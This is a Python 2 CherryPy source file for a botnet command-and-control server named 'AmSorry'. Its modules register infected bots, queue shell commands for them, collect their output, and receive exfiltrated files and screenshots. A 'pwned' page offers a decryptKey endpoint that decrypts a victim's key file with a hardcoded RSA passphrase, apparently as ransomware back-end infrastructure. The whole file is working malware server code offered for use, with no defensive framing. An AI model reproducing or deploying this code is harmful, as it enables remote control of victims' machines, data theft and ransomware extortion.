import cherrypy
import sqlite3
import time
import datetime
import os
import re
import random
import string
import hashlib
import sys

from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES, PKCS1_OAEP


COOKIE_NAME = "AMSORRYSSID"
SESSION_TIMEOUT = 30000
UPLOAD_DIR = ""

pending_uploads = []
session_cookie = None
last_session_activity = 0

html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}


def error_page(status, message, traceback, version):
    with open("error.html", "r") as f:
        html = f.read()
        return html % (status, status, message)


def html_escape(text):
    return "".join(html_escape_table.get(c,c) for c in text)


def validate_botid(candidate):
    return re.match('^[a-zA-Z0-9\s\-_]+$', candidate) is not None


def query_DB(sql, params=()):
    conn = sqlite3.connect('AmSorry.db')
    cursor = conn.cursor()
    result = []
    for row in cursor.execute(sql, params):
        result.append(row)
    conn.close()
    return result


def exec_DB(sql, params=()):
    conn = sqlite3.connect('AmSorry.db')
    cursor = conn.cursor()
    cursor.execute(sql, params)
    conn.commit()
    conn.close()


def get_admin_password():
    result = query_DB("SELECT password FROM users WHERE name='admin'")
    if result:
        return result[0][0]
    else:
        return None


def set_admin_password(admin_password):
    password_hash = hashlib.sha256()
    password_hash.update(admin_password)
    exec_DB("DELETE FROM users WHERE name='admin'")
    exec_DB("INSERT INTO users VALUES (?, ?, ?)", (None, "admin", password_hash.hexdigest()))


def require_admin(func):
    def wrapper(*args, **kwargs):
        global session_cookie
        global last_session_activity
        global SESSION_TIMEOUT
        if session_cookie and COOKIE_NAME in cherrypy.request.cookie and session_cookie == cherrypy.request.cookie[COOKIE_NAME].value:
            if time.time() - last_session_activity > SESSION_TIMEOUT:
                raise cherrypy.HTTPRedirect("/disconnect")
            else:
                last_session_activity = time.time()
                return func(*args, **kwargs)
        else:
            raise cherrypy.HTTPRedirect("/pwned")
    return wrapper


#Fonction permettant de generer un nom de fichier aleatoire
def generateTempFilename():
    tempFilename = "temp_key_file_"
    for i in range(8):
	tempFilename += random.choice(string.ascii_letters + string.digits)
    return tempFilename


class Main(object):
    @cherrypy.expose
    @require_admin
    def index(self):
        with open("Menu.html", "r") as f:
            html = f.read()
            return html

    @cherrypy.expose
    def login(self, password=''):
        admin_password = get_admin_password()
        if not admin_password:
            if password:
                set_admin_password(password)
		message = "<p class='disconnect-message'>Admin password set successfully !</p>"
		with open("disconnect.html", "r") as htmlFile:
		    html = htmlFile.read()
		    html = html.replace("<!--{{MESSAGE_DISCONNECT}}-->", message)
                    return html
            else:
                with open("CreatePassword.html", "r") as f:
                    html = f.read()
                    return html
        else:
            password_hash = hashlib.sha256()
            password_hash.update(password)
            if password_hash.hexdigest() == get_admin_password():
                global session_cookie
                session_cookie = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
                cherrypy.response.cookie[COOKIE_NAME] = session_cookie
                global last_session_activity
                last_session_activity = time.time()
                raise cherrypy.HTTPRedirect('/')
            else:
                with open("Login.html", "r") as f:
                    html = f.read()
                    return html

    @cherrypy.expose
    def disconnect(self):
        session_cookie = None
        cherrypy.response.cookie[COOKIE_NAME] = ''
        cherrypy.response.cookie[COOKIE_NAME]['expires'] = 0
	htmlFile = open("disconnect.html", "r")
	html = htmlFile.read()
	htmlFile.close()
	message = "<p class='disconnect-message'>You have been disconnected !</p>"
	html = html.replace("<!--{{MESSAGE_DISCONNECT}}-->", message)
        return html

    @cherrypy.expose
    @require_admin
    def passchange(self, password=''):
        if password:
                set_admin_password(password)
		message = "<p class='disconnect-message'>Admin password changed successfully !</p>"
		with open("disconnect.html", "r") as htmlFile:
		    html = htmlFile.read()
		    html = html.replace("<!--{{MESSAGE_DISCONNECT}}-->", message) 
                    return html
        else:
            with open("CreatePassword.html", "r") as f:
                html = f.read()
                return html

    @cherrypy.expose
    def pwned(self):
	with open("pwned.html", "r") as htmlFile:
	    html = htmlFile.read()
	    return html

    @cherrypy.expose
    def decryptKey(self, key_file):
	#On commence par charger la page html pour afficher le resultat
	htmlFile = open("pwned.html", "r")
	html = htmlFile.read()
	htmlFile.close()

	#Enregistre le fichier dans un dossier temporaire
	filename = generateTempFilename()
	if key_file.file == None:
	    warning_message = "<p class='pwned-message2 warning-message'>PLEASE PUT A FILE BEFORE CLICKING TO THE BUTTON !</p>"
	    html = html.replace("<!--{{WARNING_MESSAGE}}-->", warning_message)
	    return html
	file_content = key_file.file.read()
	save_file = open("static/temp/" + filename, "w")
	save_file.write(file_content)
	save_file.close()
	
	try:
	    #RSA Secret RSAcode
	    RSAcode = 'ImTheKey,Brow'
	    #Ouverture du fichier en mode binaire
	    key = open("static/temp/" + filename, "rb")
            #Importation de la cle privee pour le dechiffrage
	    #Utilisation du Secret RSAcode
            private_key = RSA.import_key(open('static/rsa_key/private_rsa_key.bin').read(), passphrase = RSAcode)
	    #Lecture du contenu du fichier chiffre
	    enc_session_key, nonce, tag, ciphertext = [ key.read(x)
						        for x in (private_key.size_in_bytes(), 16, 16, -1) ]
						        #Premierement, lecture de la cle privee
						        #Ensuite, lecture des 16 premiers octets que nous rangeons dans la variable 'nonce'
						        #Nous placons ensuite les 16 octets suivants dans la variable 'tag'
						        #Le reste du fichier est place dans 'ciphertext'
	
	    #PKCS1_OAEP permet d'ecrire une longueur arbitraire de donnees dans le fichier
	    cipher_rsa = PKCS1_OAEP.new(private_key)
	    #Dechiffrer la session_key en utilisant la variable 'enc_session_key'
	    session_key = cipher_rsa.decrypt(enc_session_key)

	    #Creation de la cle AES
	    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
	    #Donnees dechiffrees
	    data = cipher_aes.decrypt_and_verify(ciphertext, tag)

	    #Fermeture du fichier temporaire et suppression de ce dernier
	    key.close()
	    os.remove("static/temp/" + filename)

	    #Ecriture de la cle sur la page html
	    textareaTag = "<textarea id='key-message2' class='form-control' row='3'>" + data + "</textarea>"
	    with open("pwned.html", "r") as htmlFile:
	        html = htmlFile.read()
	        html = html.replace("<!--{{KEY_DECRYPTED}}-->", textareaTag)
	        return html
		
	except: #Si une erreur intervient tel qu'un mauvais fichier, on arrete le traitement et envoie un message d'erreur
	    key.close()
	    os.remove("static/temp/" + filename)
	    warning_message = "<p class='pwned-message2 warning-message'>ERROR DURING PROCESSING ! PLEASE TRY AGAIN :(</p>"
	    with open("pwned.html", "r") as htmlFile:
		html = htmlFile.read()
		html = html.replace("<!--{{WARNING_MESSAGE}}-->", warning_message)
		return html


class CNC(object):
    @cherrypy.expose
    @require_admin
    def index(self):
        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
        output = ""
        for bot in bot_list:
            output += '<tr><td><a href="bot?botid=%s" class="link-list">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td><td><a href="purge?botid=%s" class="btn btn-purge">Purge Terminal</a></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else datetime.datetime.strptime(time.ctime(bot[1]), '%a %b %d %H:%M:%S %Y').strftime('%d/%m/%Y %H:%M:%S'), bot[2], bot[3], bot[4],bot[5], bot[0], bot[0])
        with open("List.html", "r") as f:
            html = f.read()
            html = html.replace("<!--{{BOT_TABLE}}-->", output)
            return html

    @cherrypy.expose
    @require_admin
    def bot(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        with open("Bot.html", "r") as f:
            html = f.read()
            html = html.replace("{{botid}}", botid)
            return html

    @cherrypy.expose
    @require_admin
    def purge(self, botid):
	if not validate_botid(botid):
	    raise cherrypy.HTTPError(403)
	else:
	    exec_DB("DELETE FROM commands WHERE sent='1' AND bot=?", (botid,))
	    exec_DB("DELETE FROM output WHERE bot=?", (botid,))
	    raise cherrypy.HTTPRedirect('/cnc/')
    

class API(object):
    @cherrypy.expose
    def pop(self, botid, sysinfo, botip):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
        if not bot:
            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(botip), html_escape(sysinfo), "FR"))
        else:
            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
        if cmd:
            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
            return cmd[0][2]
        else:
            return ""

    @cherrypy.expose
    def report(self, botid, output):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))

    @cherrypy.expose
    @require_admin
    def push(self, botid, cmd):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
        if "upload" in cmd:
            uploads = cmd[cmd.find("upload"):]
            up_cmds = [i for i in uploads.split("upload ") if i]
            for upload in up_cmds:
                end_pos = upload.find(";")
                while end_pos > 0 and cmd[end_pos - 1] == '\\':
                    end_pos = cmd.find(";", end_pos + 1)
                upload_filename = upload
                if end_pos != -1:
                    upload_filename = upload_filename[:end_pos]
                pending_uploads.append(os.path.basename(upload_filename))
        if cmd.startswith("screenshot"):
            pending_uploads.append("screenshot")

    @cherrypy.expose
    @require_admin
    def stdout(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        output = ""
        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
        for entry in reversed(bot_output):
            output += "%s\n\n" % entry[2]
        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
        for entry in bot_queue:
            output += "> %s [PENDING...]\n\n" % entry[2]
        return output

    @cherrypy.expose
    def uploadpsh(self, botid, src, file):
        self.upload(botid, src, file)

    @cherrypy.expose
    def upload(self, botid, src='', uploaded=None):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        if not src:
            src = uploaded.filename
        expected_file = src
        if expected_file not in pending_uploads and src.endswith(".zip"):
            expected_file = src.split(".zip")[0]
        if expected_file in pending_uploads:
            pending_uploads.remove(expected_file)
        elif "screenshot" in pending_uploads:
            pending_uploads.remove("screenshot")
        else:
            print "Unexpected file: %s" % src
            raise cherrypy.HTTPError(403)
        global UPLOAD_DIR
        up_dir = os.path.join(UPLOAD_DIR, botid)
        if not os.path.exists(up_dir):
            os.makedirs(up_dir)
        while os.path.exists(os.path.join(up_dir, src)):
            src = "_" + src
        save_path = os.path.join(up_dir, src)
        outfile = open(save_path, 'wb')
        while True:
            data = uploaded.file.read(8192)
            if not data:
                break
            outfile.write(data)
        outfile.close()
        up_url = "../uploads/" +  html_escape(botid) + "/" + html_escape(src)
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>', html_escape(botid)))


def main():
    app = Main()
    app.api = API()
    app.cnc = CNC()
    cherrypy.config.update("conf/server.conf")
    app = cherrypy.tree.mount(app, "", "conf/server.conf")
    #app.merge({"/": { "error_page.default": error_page}})
    print "[*] Server started on %s:%s" % (cherrypy.config["server.socket_host"], cherrypy.config["server.socket_port"])
    global UPLOAD_DIR
    UPLOAD_DIR = app.config['/uploads']['tools.staticdir.dir']
    if not os.path.exists(UPLOAD_DIR):
        os.makedirs(UPLOAD_DIR)
    cherrypy.engine.start()
    cherrypy.engine.block()


if __name__ == "__main__":
    main()
